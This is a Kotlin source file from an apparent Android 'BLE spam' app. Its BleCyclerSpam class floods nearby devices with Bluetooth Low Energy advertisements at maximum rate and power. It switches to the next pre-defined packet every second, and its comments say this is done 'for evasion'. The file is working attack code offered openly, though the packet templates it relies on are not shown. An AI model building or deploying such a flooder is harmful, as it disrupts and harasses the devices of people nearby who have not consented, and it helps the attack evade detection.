package com.tutozz.blespam

import android.bluetooth.BluetoothAdapter
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseSettings
import android.os.Handler
import android.os.Looper
import android.util.Log

/**
 * Implements the high-rate, dynamic packet cycling spammer in Kotlin.
 * This class rapidly cycles through pre-defined packets for evasion purposes.
 * It extends the base Spammer class and uses a Handler for non-blocking scheduling.
 */
class BleCyclerSpam : Spammer() {
    private val TAG = "BleCyclerSpam"

    // Use the main Looper Handler for scheduling advertising control
    private val handler = Handler(Looper.getMainLooper())
    private var packetIndex = 0

    // Safely retrieve Bluetooth components. They can be null.
    private val bleAdapter: BluetoothAdapter? = BluetoothAdapter.getDefaultAdapter()
    private val bleAdvertiser = bleAdapter?.bluetoothLeAdvertiser

    // Aggressive settings for flooding (high rate + power)
    private val floodSettings: AdvertiseSettings = AdvertiseSettings.Builder()
        .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)  // Max packet rate
        .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)    // Max range
        .setConnectable(false) // Pure spam/broadcast mode
        .setTimeout(0) // Indefinite, we manage the cycle manually
        .build()

    // Define the AdvertisingCallback object for logging failures
    private val advertisingCallback = object : AdvertiseCallback() {
        override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
            super.onStartSuccess(settingsInEffect)
            // Log.d is commented out to avoid excessive logging at high rates
        }

        override fun onStartFailure(errorCode: Int) {
            super.onStartFailure(errorCode)
            Log.e(TAG, "Advertising failed. ErrorCode: $errorCode")

            // On known fatal errors, stop the spammer to prevent looping failure
            when (errorCode) {
                ADVERTISE_FAILED_INTERNAL_ERROR,
                ADVERTISE_FAILED_TOO_MANY_ADVERTISERS,
                ADVERTISE_FAILED_FEATURE_UNSUPPORTED -> {
                    Log.e(TAG, "Fatal advertising failure ($errorCode). Stopping cycler.")
                    stop()
                }
            }
        }
    }

    /**
     * The core Runnable responsible for cycling the advertisement packet.
     * This stops the current ad, builds the next packet, and starts the new ad.
     */
    private val packetCycler = object : Runnable {
        override fun run() {
            if (!isSpamming) return

            // Ensure advertiser and adapter state are valid before proceeding
            val advertiser = bleAdvertiser
            if (advertiser == null || bleAdapter?.isEnabled != true) {
                 Log.e(TAG, "Cycler stop: Advertiser not ready or Bluetooth disabled.")
                 stop() // Use stop() to clean up state
                 return
            }

            // 1. Stop the current advertisement (necessary before starting a new one)
            try {
                advertiser.stopAdvertising(advertisingCallback)
            } catch (e: Exception) {
                Log.w(TAG, "Warning: Exception during stopAdvertising. State issue? ${e.message}")
            }

            // 2. Cycle to the next packet and build the AdvertiseData
            val rawPacket = BlePacketTemplates.ADVERTISEMENT_PACKETS[packetIndex]
            val newData = BlePacketTemplates.buildAdvertiseData(rawPacket)

            // 3. Restart with new data and aggressive settings
            try {
                advertiser.startAdvertising(floodSettings, newData, advertisingCallback)
            } catch (e: Exception) {
                Log.e(TAG, "Exception during startAdvertising: ${e.message}")
                stop() // Fatal error if we can't start after a clean check
                return
            }

            // 4. Update index and schedule the next rotation
            packetIndex = (packetIndex + 1) % BlePacketTemplates.ADVERTISEMENT_PACKETS.size

            // Rotation speed (1000L) is key for Evasion
            handler.postDelayed(this, 1000L) // Fixed 1s rotation rate
        }
    }

    /**
     * Starts the cycling spam operation.
     */
    override fun start() {
        if (isSpamming) return

        // Robust check for essential components
        if (bleAdvertiser == null || bleAdapter?.isEnabled != true) {
            Log.e(TAG, "Cannot start: Bluetooth not enabled, not supported, or advertiser is null.")
            return
        }

        isSpamming = true
        // Kick off the first run immediately, which starts the cycling
        handler.post(packetCycler)
        Log.i(TAG, "BLE Cycler Spam started.")
    }

    /**
     * Stops the cycling spam operation immediately.
     */
    override fun stop() {
        if (!isSpamming) return

        isSpamming = false
        handler.removeCallbacks(packetCycler) // Stop the repetition scheduler

        // Safely stop the currently running advertisement
        try {
            bleAdvertiser?.stopAdvertising(advertisingCallback)
        } catch (e: Exception) {
            // Log warning, but proceed with stopping state
            Log.w(TAG, "Error safely stopping advertising: ${e.message}")
        }

        Log.i(TAG, "BLE Cycler Spam stopped.")
    }
}